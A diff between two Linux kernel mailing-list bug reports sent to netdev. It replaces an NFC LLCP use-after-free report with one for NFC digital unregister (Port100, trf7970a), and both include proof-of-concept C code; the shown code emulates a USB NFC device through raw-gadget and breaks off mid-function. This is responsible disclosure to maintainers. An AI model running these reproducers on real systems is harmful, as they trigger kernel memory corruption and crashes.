@@ -1,88 +1,88 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.216.45
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.214.173
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1792999470;
-	b=TQ+vRA6WcGbiz6274AI/6+VvYX9GzGfBDazBjWaheBc2mOp5xhhRQCI1TAixnuhdmJ/m
-	 FGpT50lLhsrUAMNtOVa56NcOygBUSFIovD4NOE8jNwCDEHzVcJ8nYeCjn669ZTN4r1hvE
-	 rjnFH6LsapXGphHAoAdEBu+ry1/jCTdbJxAzerKBfbi7f0VqR5XzwE8BLFqsn7hIHzwE6
-	 lDMMFwoDqW4ZiWO5NUxwE4W9GvP+6pgIxMgXW7//yzGcXas3L8V11hXUeydlPSqrITdPq
-	 fjPMWeN97pmE65TQc0Tsg8pS3GkCe0xiHoFRL7E3kdhpQuO65cEpYRVL7he4eFhuIbg==
+	t=1792999494;
+	b=ZD/6rYL+lraay/vamgWJllhA31AVxdGu8tqsMoDJOAMb6iFrmiImm9J+ElcX+AYvudma
+	 RMHQh3mpnaZekeDaJhWVgYsuRJEmnqIlGsa5iPwFU8Q5a9rPLpurj7ipX1ppbtO/WPv3X
+	 vRuhsNlpzuZxn4PTVsXBYuR8/pFvreDagD4gW2oZ3R6I4ksybRqUnVpHx497obWJn9yzF
+	 gpkYcE/KAtm9CLFLzOR5iK6YbH0o3U6OoI8DNtiWqCSL96Z3kdYnAlYlahbTARbNCVSOq
+	 o3W/NKrisorakijGZZb6uggqDqbBv3qKN5MQk+H1Fr14Sp1tH50H85UIhDrbRqkVMGQ==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1792999470;
+	a=rsa-sha256; c=relaxed/relaxed; t=1792999494;
 	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
 	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
 	 Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding:
 	 X-Mailer;
-	bh=/FL79Acv6m1rS6yeqOXXPaeFHoXOZe3d6iQCaRUj8e4=;
-	b=e7IqcMPUVz7dm7wcxRJmYFFx+DdIenwQeFO6ZXgr8SNGPfeQU4R8t7MvHLILsP4FBqFu
-	 jHHzWzg8t7aWwGEhY9gN7QqnfrZCuEhvgNZO3ttsEdBnhNeaGBrQocM0rvOZF4boO/X+6
-	 1fqlZjKpZhw6cbB1sfcM1QaVkH/E4UXeCSdNzH5lMfeUsHyTQAkOS+mhRukO3RvHLaaTc
-	 82mZrZ6mjqYOxFHGRwwktrh5XjyAbq0WvCgBg+dotq8iIjwGOQArK2u4QPHMcSWnFKJF4
-	 UItj4PMSJRA4nhrczV7TuM5PI8ozf+3nxdSACwItivwUU14Yc6umvyJWmCwoRQnXbEw==
+	bh=gJDBjtupISbYAFoo+SFIOZYpPcvQqGdM/GMzNlcN13E=;
+	b=xBt4REIlr7O9RWtBeX/xYWMdIdad++aq7BX/CAhpypUqXK9OLVOWxysmCAOUX3HIS8fz
+	 K/ZwEL1KR2eTHJc43nQOPHPb0pFj3JnIwlWuJQG8ecHW3s5aOHc/VJleFRYOWdd8YSUZV
+	 8bNnblEtfzVihidEmhatEEEr0HraQUytpzxmINT0MHntBxzAdXcx0MRHMLU7avFh2UVP7
+	 7NSHBQ8P72qlEDlMgl0GXSmXD79VTp+/H1WpnX1dRFYMehtBH2Fsob6JrjILQeaqn5MEq
+	 pbmDB0dM8AO/amO4G3SBwOSa/JHSSkzSQJCn1i5X8k6w1/6ByBjJkaD+iAfPpxFSzmg==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
 	dmarc=pass header.from=gmail.com;
 	spf=pass smtp.mailfrom=gmail.com;
-	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b="n/ZiDsFK";
-	arc=none smtp.remote-ip=209.85.216.45
-Received: from mail-pj1-f45.google.com (mail-pj1-f45.google.com [209.85.216.45])
+	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b="BVd/RZc5";
+	arc=none smtp.remote-ip=209.85.214.173
+Received: from mail-pl1-f173.google.com (mail-pl1-f173.google.com [209.85.214.173])
 	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 02ECD606A31A
-	for <netdev@vger.kernel.org>; Mon, 26 Oct 2026 07:24:29 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 02ECD606A31A
+	by smtp.subspace.kernel.org (Postfix) with UTF8SMTPS id 48432606A31F
+	for <netdev@vger.kernel.org>; Mon, 26 Oct 2026 07:24:53 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 48432606A31F
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b=n/ZiDsFK
-Received: by mail-pj1-f45.google.com with SMTP id 98e67ed59e1d1-3adac5b29ebso1567956a91.2
-        for <netdev@vger.kernel.org>; Mon, 26 Oct 2026 00:24:29 -0700 (PDT)
+	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b=BVd/RZc5
+Received: by mail-pl1-f173.google.com with SMTP id d9443c01a7336-2e8f2c3ad6bso16701745ad.1
+        for <netdev@vger.kernel.org>; Mon, 26 Oct 2026 00:24:53 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1792999469; x=1793604269; darn=vger.kernel.org;
+        d=gmail.com; s=20251104; t=1792999493; x=1793604293; darn=vger.kernel.org;
         h=content-transfer-encoding:content-type:mime-version:message-id:date
          :subject:cc:to:from:from:to:cc:subject:date:message-id:reply-to
          :content-type;
-        bh=/FL79Acv6m1rS6yeqOXXPaeFHoXOZe3d6iQCaRUj8e4=;
-        b=n/ZiDsFKxki0ma+UZzC5+zgstg6L1JdPy9dNPfYppZK8NBxYvbeBCzcFDq+rBlxtgm
-         RNfEPYwUEkUVbvjXAh/bJr7sBdmiuVaaENlvOehSbVfCIK5Q8BLQPtztqPWj1+8S7KME
-         D0YpHkoETKZ0zYl1vpVn3U18xQh+VnGDg8J5d2UL0I6mUbGSpEDMd2+MTzEiuWojFuGJ
-         3L1NAvV4yvsGPb4IoGXibrPIEQ6afBN9t6SndPZUM86aGc8Fhn0QKr1YcO+HFkI3wY4D
-         5dh7SqmHcH3SDEb6zcPnTgcPBXDdKEq2Pm5Gfoumt8R5Hi6lLWcNwzBAdhTusJz6BkRj
-         Aj8g==
+        bh=gJDBjtupISbYAFoo+SFIOZYpPcvQqGdM/GMzNlcN13E=;
+        b=BVd/RZc5erBWyJVkrt6t770RdUMV3yGRpFBcxtGYtXJZsJfza4E7maS7Xq+ozOx99C
+         nxxSiPlXTTFo98CEK5CHzWutwGVCZLqmJGq1rZ5yuojpiCzrFKNhGkBkfncbbM9j8NA5
+         /WFG31fTUip+d/vXR+WiN9VGfTRkLl22S8I2I6lCnmgAZItpP35vWvB6g0VUDavhrnwq
+         XrU2FdxFR/Aot4NeQPiId3YwfecyUNyz8PAXQgsAy1lbvFAvdeoG0/nXSGz4mUo2zB51
+         oUVhL24KqDgGAz4tbRQuNzJxdTWPBRVDkM8g3+s2AWwxF0Vg4neWV9ZbMyAXBr9Kh3Lc
+         u+ew==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1792999469; x=1793604269;
+        d=1e100.net; s=20260707; t=1792999493; x=1793604293;
         h=content-transfer-encoding:content-type:mime-version:message-id:date
          :subject:cc:to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject
          :date:message-id:reply-to:content-type;
-        bh=/FL79Acv6m1rS6yeqOXXPaeFHoXOZe3d6iQCaRUj8e4=;
-        b=e1I5DfHC97TSp5GjNSi9hZfvrVqOnsP/wEFnCIpayri/leDHcONDKGQrhSzgaTtGec
-         dU8AOX0khH/aws3GlCGJSh40GHQ/NrHvSqKFk1hieVZSfYRy9NA2IUhqeugzVnxLXo3/
-         fx3PfP8m1xV78oFYVC4sEPyi+HxRI7s3OiWkNk6eVEtbON80nIJhTml/x12sQA1JiYT2
-         EJ/w9xQRo14FkIYnGujCOoaxsenY6rNjpNuLW++OFNpyvQpTQ7xz2FG4fUBwE430j2wj
-         hu8fnoBPqFaRrIHigMKYvC6D69GuWG3QvFLKQgVB3L6jR4X9+osRMfS12vWOoxGG7znG
-         Ll7Q==
-X-Gm-Message-State: AFq9FYI5qVdfO0wGAGa9EoWlhCAVNPOR9gKawjk04AHf2QeaYFnExsLP
-	/Jb868Bojp5IniipZ9X/MAx8VndL7BP/mPZZXSJqozPGSzOYcZPlnOPJ
-X-Gm-Gg: AYBFou2znr51mHcvv7B5byNnU4LRefrTuZ1RrCuvovzP1et3R/L289mCg5DImCJHexK
-	85IvwmEwx52g0tukT02zqegRvBV+Mi3DmEKGK7AeOHA8muy2oDVMRrUGycH656oKg+3Hu1uOhI3
-	iCfMfxR4YVVwbzNN1fxFg7NL6UUrCJvupvSby39sp0PtW5//FQ0u0DYszsW90Tub1NCRf0U/ssr
-	FClCY0NJbNR/Rv3SewmPC5mOxl8FiQD36xiIVvti2MjE4gu1dj30jTWPN0NHzKlzF54zNjDCyfT
-	RSKim7NyOpP/GA9ecU6FSzzI2xAR0A4t5bJAbmdpMzyizeA37d/WxNcd2KEequValrGBUmRwa2Z
-	Do2kW0HrqH5HfyPN3N1ywu9cihWUfAnnQOzOY5dT0Biq+VE6er3ra+ufmXSbr0ZAl/P3bbRM6QB
-	2IFSYLIUdj6CqfCD0reBIaGfqVMjurXGtMyzJp6gOgScfsMNsECAo5pxNWdDvbDgkaJSGnNuxAI
-	9ipS5AqyLTTHWFWXmfFAMKpQVgs4TeRFQLhw+vhtdJ3fHf1ycJnwCgJ3lqaM9TQwceUoE9NM0/C
-	CQzGvBXTKmnrZdk2Mn9ZiCdYsFBky0NWk+c+T9gb
-X-Received: by 2002:a17:90b:1c8e:b0:3a8:9b79:e6ea with SMTP id 98e67ed59e1d1-3adeb122e89mr5299845a91.59.1792999469213;
-        Mon, 26 Oct 2026 00:24:29 -0700 (PDT)
-Received: from 1137-cover.eml (awork078078.netvigator.com. [203.198.250.78])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3adebadfa82sm7242797a91.8.2026.10.26.00.24.21
+        bh=gJDBjtupISbYAFoo+SFIOZYpPcvQqGdM/GMzNlcN13E=;
+        b=nauwCfzFotOlyEd4dUbljs5oTqQi5+vIc6ONM4kdOWrIIXnMplnPA7F92cZjZyfCTO
+         Ed4DSJVPORNTkkRqGd8OT1IqnQkG1YZQ5kHed5xCVpEyyN4Zzruu7cggxBxX33esv4zZ
+         KSw3YJZ7gKP2eRIGNy9dXIYgBSAYSMOWAGnyhXlD3LXn1OKkmkd37mFZNsIE6KDUXSts
+         zDyZ4FHybTladQUTEqyRuRcVEAl4vWYLjBGq09eLKyqQxMcSXK//wTCWvieTF0LlAf9H
+         m6yhaSkKSftp+oCi6CjwPF1bzZtzkJJM4zKKwQetvnB0DkKcaWywL+bvyqZfBiEY45Sl
+         v3rg==
+X-Gm-Message-State: AFq9FYLcezvfQYD0pUNcoJS+5v63ek9APXxpQBwo6TOaEeSeH1i/83fM
+	47tEptkcsVQe0IOEEG/LYEVoZQOKJjCSIVRaAGezp5OuL9RECw1dovNQ
+X-Gm-Gg: AYBFou3xYu6N+7RS2eD1zlxWdEm/wu/yvPD5bD6JFhWI1lzTuCe+W/KmM/56vCoJThk
+	QVzk2FkE4sDL+W8BUEbbwUlg1IoKUWjhr2WerJMQhVEZlXys/twwmt3ZG9l7nEuNNNmrTkPvJrA
+	UtasUAFmv8ytJwXRb0Yruyy8/b81V3iyXrs6R0e+DaqCdGjy59e19Rh4tMraF9pTbuYp5I4ZKZ5
+	rH0ZN6Np0FkerxaoheDvSVdITVDPxAmH1jcIQL1nlJZ+RpQHlpPAlpJV4nA1zmlF7lHz979Jgsp
+	L90gc3bytAhkUrn6rmP/FZQ8ROi3UKv+mJAwYBjuaMskP+RgC41oswXppBfplTXhvcpKUPSnf8m
+	I7KXqqQOt5Q972s7VfKVCnyWBCh/esN/YKsiXJNT1N2jibc5/fiw5PGdV3RZOKvHGMyIQPuBX5U
+	0He7K3IuR+AkpkHtuF4ARpmelHNMxkXmKKoCh3EDGNpKo7uioQ0HfpL8g00OWew5hGvkwBtrSqx
+	nZfc4O4hdjJFUVIS457fTKGDfBK0Z00Z+sNe3X15Ix8MQnzr2WTPYA8ZHYl6dTotYksy8ARU3O1
+	qsx02ZoX+zAywvYJxNj8JODggC7WrpqdFSq9PZE=
+X-Received: by 2002:a17:903:1b08:b0:2e9:8bd4:577d with SMTP id d9443c01a7336-2ea9c875126mr57590735ad.37.1792999492358;
+        Mon, 26 Oct 2026 00:24:52 -0700 (PDT)
+Received: from 822-cover.eml (awork078078.netvigator.com. [203.198.250.78])
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2ea9b14d1ddsm12862885ad.40.2026.10.26.00.24.42
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Mon, 26 Oct 2026 00:24:28 -0700 (PDT)
+        Mon, 26 Oct 2026 00:24:51 -0700 (PDT)
 From: Yuqi Xu <xuyuqiabc@gmail.com>
 To: netdev@vger.kernel.org, oe-linux-nfc@lists.linux.dev
-Cc: David Heidelberg <david@ixit.cz>, "David S. Miller" <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>, stable@vger.kernel.org, Vega <vega@nebusec.ai>, Ren Wei <weir@nebusec.ai>, xuyq21@lenovo.com
-Subject: [PATCH net 0/1] nfc: llcp: fix use-after-free when purging local
+Cc: David Heidelberg <david@ixit.cz>, "David S. Miller" <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>, stable@vger.kernel.org, Vega <vega@nebusec.ai>, Ren Wei <weir@nebusec.ai>, xuyq21@lenovo.com, Mark Greer <mgreer@animalcreek.com>, "Uwe Kleine-König (The Capable Hub)" <u.kleine-koenig@baylibre.com>, Ian Ray <ian.ray@gehealthcare.com>, Dmitry Torokhov <dmitry.torokhov@gmail.com>, Thierry Escande <thierry.escande@linux.intel.com>, Samuel Ortiz <sameo@linux.intel.com>
+Subject: [PATCH net 0/1] nfc: digital: fix use-after-free in unregister
 Date: Mon, 26 Oct 2026 15:24:07 +0800
-Message-ID: <cover.1791171477.git.xuyuqiabc@gmail.com>
+Message-ID: <cover.1791172164.git.xuyuqiabc@gmail.com>
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Post: <mailto:netdev@vger.kernel.org>
@@ -98,12 +98,11 @@ X-Mailer: git-send-email 2.56.0
 
 Hi Linux kernel maintainers,
 
-We found and validated an issue in net/nfc/llcp_core.c. The bug is
-reachable by root. NFC generic netlink admin commands used by the
-PoC (DEV_UP, START_POLL) fail for an unprivileged user, including
-inside a user namespace.
+We found and validated an issue in net/nfc/digital_core.c. Triggering
+it requires root. The reproducer uses raw-gadget and driver unbind,
+which fail from an unprivileged user and from a user namespace.
 
-This bug is tracked at: https://bugtracker.nebusec.ai/f/1137
+This bug is tracked at: https://bugtracker.nebusec.ai/f/822
 
 We will provide detailed information about the bug
 in this email, along with a PoC to trigger it.
@@ -112,507 +111,1131 @@ in this email, along with a PoC to trigger it.
 
 Bug details:
 
-nfc_llcp_socket_purge() walks local->tx_queue with
-skb_queue_walk_safe() and then unlinks skbs whose sk pointer matches
-the socket being purged. The walk itself does not take
-local->tx_queue.lock. nfc_llcp_tx_work() dequeues from that queue
-and may put the skb back with skb_queue_head(). The LLCP send path
-queues with skb_queue_tail(), and device teardown purges the same
-queue. Those sites all take local->tx_queue.lock. A lockless walk
-can dereference an skb another CPU has already freed, which is a
-use-after-free and can corrupt the list.
+nfc_digital_unregister_device() cancels the poll, command, and
+completion work items, then frees every digital_cmd still queued. It
+does not abort a command the driver has already accepted.
 
-The unlocked walk was introduced by commit f31652a58bee
-("NFC: Purge LLCP socket Tx queues when being disconnected").
+digital_wq_cmd() passes that object to the driver as the completion
+argument. digital_send_cmd_complete() later stores the response with
+cmd->resp = resp. Once unregister has freed cmd, that store is a
+use-after-free.
 
-The fix holds local->tx_queue.lock across the walk, unlinks matching
-skbs with __skb_unlink(), and frees them only after the lock is
-dropped.
+On Port100 the URB handler does not call into the digital stack
+itself. It queues port100_wq_cmd_complete. Disconnect then returns,
+and devm frees struct port100 while that embedded work_struct is
+still active. The log below is the resulting ODEBUG warning, with
+panic_on_warn set. That same work is what calls back into the freed
+command.
 
-This is not the accept_queue lifecycle race already posted on the
-list. That bug is a different object and a different fix.
+trf7970a has the same problem through a delayed timeout work and its
+IRQ thread. Its MD listening state was not handled by abort or
+shutdown, so the patch also stops that timer and handles the state
+before the device is released.
 
 Reproducer:
 
-Root, in the initial namespace. The race is timing-sensitive, so
-rerun the program if it does not trigger immediately. Commands from
-the tracker materials:
+  make
+  # as root in the guest
+  ./poc.sh
 
-  gcc -O2 -Wall -Wextra -o poc poc.c
-  ./poc
-
-unshare -Ur and unshare -Urn do not reach the NFC netlink commands.
-The reporter ran it with CONFIG_NFC, CONFIG_NFC_NCI, CONFIG_NFC_SIM,
-KASAN and panic_on_warn.
+poc.sh enables panic_on_warn and runs the static binary built from
+the poc.c below. It emulates a Sony Port100 on dummy_hcd, brings the
+NFC device up, starts a poll, withholds the in-flight IN_COMM_RF
+response, and unbinds drivers/port100. The supplied write-up reports
+that this crashes reliably as root.
 
 ------BEGIN poc.c------
-
 #define _GNU_SOURCE
+#include <arpa/inet.h>
+#include <dirent.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/genetlink.h>
+#include <linux/netlink.h>
+#include <linux/nfc.h>
+#include <linux/usb/ch9.h>
+#include <pthread.h>
+#include <sched.h>
+#include <stdbool.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <stdint.h>
-#include <stdbool.h>
 #include <string.h>
-#include <errno.h>
-#include <unistd.h>
-#include <fcntl.h>
+#include <sys/ioctl.h>
 #include <sys/socket.h>
+#include <sys/stat.h>
 #include <sys/types.h>
-#include <sys/time.h>
-#include <linux/netlink.h>
-#include <linux/genetlink.h>
-#include <linux/nfc.h>
+#include <time.h>
+#include <unistd.h>
 
-#ifndef NLA_ALIGNTO
-#define NLA_ALIGNTO 4
-#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
+#ifndef ARRAY_SIZE
+#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
 #endif
 
-#define MAX_MSG 4096
-#define LLCP_PDU_DISC 0x5
+#define UDC_NAME_LENGTH_MAX 128
+struct usb_raw_init {
+	uint8_t driver_name[UDC_NAME_LENGTH_MAX];
+	uint8_t device_name[UDC_NAME_LENGTH_MAX];
+	uint8_t speed;
+};
 
-static int nl_open(void) {
-    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
-    if (fd < 0) {
-        perror("socket(AF_NETLINK)");
-        return -1;
-    }
-    struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
-    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-        perror("bind(AF_NETLINK)");
-        close(fd);
-        return -1;
-    }
-    return fd;
+enum usb_raw_event_type {
+	USB_RAW_EVENT_INVALID = 0,
+	USB_RAW_EVENT_CONNECT = 1,
+	USB_RAW_EVENT_CONTROL = 2,
+};
+
+struct usb_raw_event {
+	uint32_t type;
+	uint32_t length;
+	uint8_t data[0];
+};
+
+struct usb_raw_ep_io {
+	uint16_t ep;
+	uint16_t flags;
+	uint32_t length;
+	uint8_t data[0];
+};
+
+#define USB_RAW_IOCTL_INIT _IOW('U', 0, struct usb_raw_init)
+#define USB_RAW_IOCTL_RUN _IO('U', 1)
+#define USB_RAW_IOCTL_EVENT_FETCH _IOR('U', 2, struct usb_raw_event)
+#define USB_RAW_IOCTL_EP0_WRITE _IOW('U', 3, struct usb_raw_ep_io)
+#define USB_RAW_IOCTL_EP0_READ _IOWR('U', 4, struct usb_raw_ep_io)
+#define USB_RAW_IOCTL_EP_ENABLE _IOW('U', 5, struct usb_endpoint_descriptor)
+#define USB_RAW_IOCTL_EP_WRITE _IOW('U', 7, struct usb_raw_ep_io)
+#define USB_RAW_IOCTL_EP_READ _IOWR('U', 8, struct usb_raw_ep_io)
+#define USB_RAW_IOCTL_CONFIGURE _IO('U', 9)
+#define USB_RAW_IOCTL_VBUS_DRAW _IOW('U', 10, uint32_t)
+
+#define USB_MAX_PACKET_SIZE 4096
+struct usb_raw_control_event {
+	struct usb_raw_event inner;
+	struct usb_ctrlrequest ctrl;
+	uint8_t data[USB_MAX_PACKET_SIZE];
+};
+
+struct usb_raw_ep_io_data {
+	struct usb_raw_ep_io inner;
+	uint8_t data[USB_MAX_PACKET_SIZE];
+};
+
+#define NLA_ALIGNTO 4
+#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
+
+static uint16_t le16_checksum_rule(uint16_t value)
+{
+	uint8_t low = (uint8_t)(value & 0xff);
+	uint8_t high = (uint8_t)((value >> 8) & 0xff);
+	return (uint8_t)(~(low + high) + 1);
 }
 
-static size_t nla_put(char *buf, size_t off, uint16_t type, const void *data, uint16_t len) {
-    struct nlattr *na = (struct nlattr *)(buf + off);
-    na->nla_type = type;
-    na->nla_len = NLA_HDRLEN + len;
-    memcpy((char *)na + NLA_HDRLEN, data, len);
-    return off + NLA_ALIGN(na->nla_len);
+static uint8_t sum_checksum_rule(const uint8_t *data, size_t len)
+{
+	uint8_t sum = 0;
+	size_t i;
+
+	for (i = 0; i < len; i++)
+		sum += data[i];
+
+	return (uint8_t)(~sum + 1);
 }
 
-static int nl_send(int fd, uint16_t type, uint16_t flags, uint8_t cmd,
-                   const void *attrs, size_t attrs_len) {
-    char buf[MAX_MSG];
-    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
-    struct genlmsghdr *gh = (struct genlmsghdr *)(buf + sizeof(*nlh));
-    struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };
+struct port100_ctx {
+	int fd;
+	int ep_in;
+	int ep_out;
+	volatile bool configured;
+	volatile bool running;
+	volatile bool saw_in_comm_rf;
+	pthread_mutex_t lock;
+	pthread_cond_t cond;
+};
 
-    memset(buf, 0, sizeof(buf));
-    nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN) + attrs_len;
-    nlh->nlmsg_type = type;
-    nlh->nlmsg_flags = flags;
-    nlh->nlmsg_seq = (uint32_t)getpid();
-    nlh->nlmsg_pid = 0;
-    gh->cmd = cmd;
-    gh->version = 1;
-    if (attrs_len)
-        memcpy(buf + NLMSG_LENGTH(GENL_HDRLEN), attrs, attrs_len);
+struct hog_ctx {
+	volatile bool run;
+	int cpu;
+};
 
-    ssize_t n = sendto(fd, buf, nlh->nlmsg_len, 0,
-                       (struct sockaddr *)&nladdr, sizeof(nladdr));
-    if (n < 0) {
-        perror("sendto(netlink)");
-        return -1;
-    }
-    return 0;
+static const uint8_t ack_frame[6] = {0x00, 0x00, 0xff, 0x00, 0xff, 0x00};
+
+static int raw_ep0_write(int fd, const void *data, uint32_t len)
+{
+	struct usb_raw_ep_io_data io;
+
+	memset(&io, 0, sizeof(io));
+	io.inner.ep = 0;
+	io.inner.flags = 0;
+	if (len > sizeof(io.data))
+		len = 0;
+	io.inner.length = len;
+	if (len)
+		memcpy(io.data, data, len);
+
+	return ioctl(fd, USB_RAW_IOCTL_EP0_WRITE, &io);
 }
 
-static int nl_recv_ack(int fd) {
-    char buf[MAX_MSG];
-    int n = recv(fd, buf, sizeof(buf), 0);
-    if (n < 0) {
-        perror("recv(netlink)");
-        return -1;
-    }
-    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
-    if (nlh->nlmsg_type == NLMSG_ERROR) {
-        struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nlh);
-        if (e->error) {
-            errno = -e->error;
-            perror("netlink ack");
-            return -1;
-        }
-    }
-    return 0;
+static int raw_ep0_read(int fd, uint32_t len)
+{
+	struct usb_raw_ep_io_data io;
+
+	memset(&io, 0, sizeof(io));
+	io.inner.ep = 0;
+	io.inner.flags = 0;
+	if (len > sizeof(io.data))
+		len = sizeof(io.data);
+	io.inner.length = len;
+
+	return ioctl(fd, USB_RAW_IOCTL_EP0_READ, &io);
 }
 
-static int get_family_id(int fd) {
-    char attrs[256];
-    size_t off = 0;
-    const char fam[] = NFC_GENL_NAME;
+static int raw_ep_write(int fd, int ep, const void *data, uint32_t len)
+{
+	struct usb_raw_ep_io_data io;
 
-    off = nla_put(attrs, off, CTRL_ATTR_FAMILY_NAME, fam, sizeof(fam));
-    if (nl_send(fd, GENL_ID_CTRL, NLM_F_REQUEST, CTRL_CMD_GETFAMILY, attrs, off) < 0)
-        return -1;
+	memset(&io, 0, sizeof(io));
+	io.inner.ep = ep;
+	io.inner.flags = 0;
+	if (len > sizeof(io.data))
+		len = sizeof(io.data);
+	io.inner.length = len;
+	if (len)
+		memcpy(io.data, data, len);
 
-    char buf[MAX_MSG];
-    int n = recv(fd, buf, sizeof(buf), 0);
-    if (n < 0) {
-        perror("recv(getfamily)");
-        return -1;
-    }
-
-    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
-    if (nlh->nlmsg_type == NLMSG_ERROR)
-        return -1;
-
-    struct genlmsghdr *gh = (struct genlmsghdr *)NLMSG_DATA(nlh);
-    int rem = (int)nlh->nlmsg_len - (int)NLMSG_LENGTH(GENL_HDRLEN);
-    struct nlattr *na = (struct nlattr *)((char *)gh + GENL_HDRLEN);
-
-    int family_id = -1;
-    while (rem >= (int)sizeof(*na) && na->nla_len >= sizeof(*na) && na->nla_len <= rem) {
-        if (na->nla_type == CTRL_ATTR_FAMILY_ID)
-            family_id = *(uint16_t *)((char *)na + NLA_HDRLEN);
-        rem -= NLA_ALIGN(na->nla_len);
-        na = (struct nlattr *)((char *)na + NLA_ALIGN(na->nla_len));
-    }
-
-    return family_id;
+	return ioctl(fd, USB_RAW_IOCTL_EP_WRITE, &io);
 }
 
-static int send_idx_cmd(int fd, int family, uint8_t cmd, uint32_t idx) {
-    char attrs[64];
-    size_t off = 0;
+static int raw_ep_read(int fd, int ep, uint8_t *buf, uint32_t *len)
+{
+	struct usb_raw_ep_io_data io;
+	uint32_t in_len = *len;
+	int rv;
 
-    off = nla_put(attrs, off, NFC_ATTR_DEVICE_INDEX, &idx, sizeof(idx));
-    if (nl_send(fd, family, NLM_F_REQUEST | NLM_F_ACK, cmd, attrs, off) < 0)
-        return -1;
-    return nl_recv_ack(fd);
+	memset(&io, 0, sizeof(io));
+	io.inner.ep = ep;
+	io.inner.flags = 0;
+	if (in_len > sizeof(io.data))
+		in_len = sizeof(io.data);
+	io.inner.length = in_len;
+
+	rv = ioctl(fd, USB_RAW_IOCTL_EP_READ, &io);
+	if (rv < 0)
+		return rv;
+
+	if (io.inner.length > *len)
+		io.inner.length = *len;
+	memcpy(buf, io.data, io.inner.length);
+	*len = io.inner.length;
+
+	return 0;
 }
 
-static int start_poll(int fd, int family, uint32_t idx, uint32_t im, uint32_t tm) {
-    char attrs[128];
-    size_t off = 0;
-
-    off = nla_put(attrs, off, NFC_ATTR_DEVICE_INDEX, &idx, sizeof(idx));
-    if (im)
-        off = nla_put(attrs, off, NFC_ATTR_IM_PROTOCOLS, &im, sizeof(im));
-    if (tm)
-        off = nla_put(attrs, off, NFC_ATTR_TM_PROTOCOLS, &tm, sizeof(tm));
-
-    if (nl_send(fd, family, NLM_F_REQUEST | NLM_F_ACK, NFC_CMD_START_POLL, attrs, off) < 0)
-        return -1;
-    return nl_recv_ack(fd);
+static int send_ack(struct port100_ctx *ctx)
+{
+	return raw_ep_write(ctx->fd, ctx->ep_in, ack_frame, sizeof(ack_frame));
 }
 
+static size_t build_port100_response(uint8_t cmd, const uint8_t *payload,
+				     size_t payload_len, uint8_t *out,
+				     size_t out_sz)
+{
+	uint16_t datalen;
+	size_t total;
+	uint8_t dsum;
 
-static int dep_link_up_cmd(int fd, int family, uint32_t idx, uint32_t target_idx, uint8_t comm_mode) {
-    char attrs[128];
-    size_t off = 0;
+	datalen = (uint16_t)(2 + payload_len);
+	total = 8 + datalen + 2;
+	if (out_sz < total)
+		return 0;
 
-    off = nla_put(attrs, off, NFC_ATTR_DEVICE_INDEX, &idx, sizeof(idx));
-    off = nla_put(attrs, off, NFC_ATTR_TARGET_INDEX, &target_idx, sizeof(target_idx));
-    off = nla_put(attrs, off, NFC_ATTR_COMM_MODE, &comm_mode, sizeof(comm_mode));
+	out[0] = 0x00;
+	out[1] = 0x00;
